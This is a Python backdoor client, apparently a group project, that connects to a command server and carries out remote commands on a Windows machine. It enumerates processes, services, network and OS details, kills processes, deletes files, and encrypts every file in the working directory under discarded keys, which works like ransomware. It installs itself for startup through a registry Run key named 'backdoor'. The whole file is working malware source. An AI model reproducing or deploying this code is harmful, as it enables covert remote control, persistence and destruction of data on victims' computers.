import os
import socket
import psutil
import platform
import string
import random
from shutil import copyfile
import subprocess
from cryptography.fernet import Fernet

s = socket.socket()
host = '127.0.0.1'
port = 9090
s.connect((host, port))

print('Connected to server')


def get_processes():
    processes = ''
    for p in psutil.process_iter():
        processes += f"{p.pid}. {p.name()} \n"
    return processes


def kill_process(pid):
    proc_found = False
    for proc in psutil.process_iter():
        if proc.pid == int(pid):
            proc.kill()
            proc_found = True
    if proc_found:
        return f'Successfully terminated PID {pid}'
    else:
        return f'PID {pid} not found'


def get_cpu_usage(time):
    cpu_percent = psutil.cpu_percent(int(time))
    return f'CPU Usage within {time} second is {str(cpu_percent)}%'


def get_services(name):
    services = ''
    if name == 'all':
        for index, service in enumerate(psutil.win_service_iter()):
            services += f"{index + 1}. {service.as_dict()['name']} - {service.as_dict()['display_name']} \n"
    else:
        try:
            service = psutil.win_service_get(name).as_dict()
            services += f"[Viewing Details of Service \'{service['name']}\'] \n"
            services += f"Display Name: {service['display_name']} \n"
            services += f"Bin Path: {service['binpath']} \n"
            services += f"Start Type: {service['start_type']} \n"
            services += f"Status: {service['status']} \n"
            services += f"PID: {service['pid']} \n"
            services += f"Description: {service['description']} \n"
        except psutil.NoSuchProcess:
            services += f"No Service Named '{name}'"
    return services


def persistence():
    file_path = os.path.realpath(__file__)  # Get the path of this running script
    temp_path = os.getenv('TEMP')  # Get %temp% path of the current machine
    letters = string.ascii_letters + string.digits  # Assign letter range for 'folder_name'
    folder_name = ''.join(random.choice(letters) for i in range(10))  # Create a random folder name
    os.mkdir(folder_name)  # Create the folder
    dst_path = temp_path + '\\' + folder_name + '\\backdoor_client.exe'  # Path to copy the backdoor to
    copyfile(file_path, dst_path)  # Copy our script into the new created folder
    subprocess.call(
        'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d "' + dst_path + '"',
        shell=True)
    # Add a new record into registry, pointing to the new copied script
    # This registry record makes the computer runs the script upon startup
    return f'Persistence Backdoor Created at {dst_path}'


def network_inf():
    network_info = ''
    hostname = socket.gethostname()
    network_info += f"The Computer Name: {hostname} \n\n"
    addresses = psutil.net_if_addrs()
    for name in addresses:
        try:
            ip_address = addresses[name][1].address
            netmask = addresses[name][1].netmask
            mac_address = addresses[name][0].address
            network_info += f"[{name}] \n"
            network_info += f"IP Address: {ip_address} \n"
            network_info += f"Netmask: {netmask} \n"
            network_info += f"Mac Address:{mac_address} \n\n"
        except:
            pass
    return network_info


def pwd():
    path = os.getcwd()
    return path


def annoy(quantity):
    import string
    import random
    letters = string.ascii_letters
    for j in range(int(quantity)):
        os.mkdir(''.join(random.choice(letters) for i in range(100)))
    return f"Successfully create {quantity} random folders in the current directory"


def move(where):
    try:
        os.chdir(rf"{where}")
        return f"Directory changed to {where}"
    except:
        return "Directory does not exist"


def dir():
    items = '[Items in this category] \n'
    for i in (os.scandir(path='.')):
        items += f'{[i.name]} \n'
    return items


def getos():
    os_info = ''
    os_info += f"\nMachine Name: {platform.node()} \n"
    os_info += f"OS Version: {platform.system()} {platform.release()} {platform.version()} \n"
    os_info += f"OS in my system: {platform.architecture()} {platform.machine()} \n"
    os_info += f"Processor: {platform.processor()} \n"
    return os_info


def encrypt_files():

    def load_key():
        return open('key.key', 'rb').read()

    def generate_encrypt(filename, key):
        f = Fernet(key)
        with open(filename, "rb") as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(filename, "wb") as file:
            file.write(encrypted_data)

    items = os.listdir(os.getcwd())
    item_count = 0
    encrypted_items = 'Encrypting items ... \n'
    for i in items:
        if '.' in i:
            key = Fernet.generate_key()
            generate_encrypt(os.path.join(os.getcwd(), i), key)
            item_count += 1
            encrypted_items += f"{i} encrypted with key: {key} \n"
    encrypted_items += f"Successfully encrypted {str(item_count)} items in this directory"
    return encrypted_items


def ram(category):
    ram = 'Unknown Argument'
    if category == 'info':
        ram = '[Ram Information Summary] \n'
        x = dict(psutil.virtual_memory()._asdict())
        for i in x:
            if i == 'percent':
                ram += f"{i} -- {round(x[i], 2)} % \n"
            else:
                ram += f"{i} -- {round(x[i] / 1024 / 1024 / 1024, 2)} GB \n"  # Output will be printed in GBs
    elif category == 'util':
        ram = '[Ram Utilization Summary] \n'
        used_ram = psutil.virtual_memory().percent
        available_ram = round(psutil.virtual_memory().available * 100 / psutil.virtual_memory().total, 2)
        ram += f"Percentage of used RAM: {used_ram} % \n"
        ram += f"Percentage of available RAM: {available_ram} % \n"
    return ram


def file_deletion(path):
    if os.path.exists(path):
        os.remove(path)
        # Print the statement once
        # the file is deleted
        response = "File deleted !"
    else:
        # Print if file is not present
        response = "File does not exist !"
    return response


while True:
    command = s.recv(1024)
    command = command.decode()
    split_command = command.split(' ')
    cmd = split_command[0]
    try:
        arg = split_command[1]
    except IndexError:
        pass


    # Lai Zhen
    if cmd == 'getproc':
        s.send(get_processes().encode())
    elif cmd == 'killproc':
        s.send(kill_process(arg).encode())
    elif cmd == 'cpupercent':
        s.send(get_cpu_usage(arg).encode())
    elif cmd == 'getsvc':
        s.send(get_services(arg).encode())
    elif cmd == 'persistence':
        s.send(persistence().encode())

    # Yong Yuan
    elif cmd == 'networkinf':
        s.send(network_inf().encode())
    if cmd == 'pwd':
        s.send(pwd().encode())
    elif cmd == 'annoy':
        s.send(annoy(arg).encode())
    elif cmd == 'move':
        s.send(move(arg).encode())
    elif cmd == 'dir':
        s.send(dir().encode())

    # Ghuan Ying
    elif cmd == 'getos':
        s.send(getos().encode())
    elif cmd == 'encrypt_files':
        s.send(encrypt_files().encode())

    # Melveen
    elif cmd == 'ram':
        s.send(ram(arg).encode())
    elif cmd == 'file_deletion':
        s.send(file_deletion(arg).encode())

    elif cmd == 'exit':
        s.send('Closing connection...'.encode())
        s.close()
        exit()
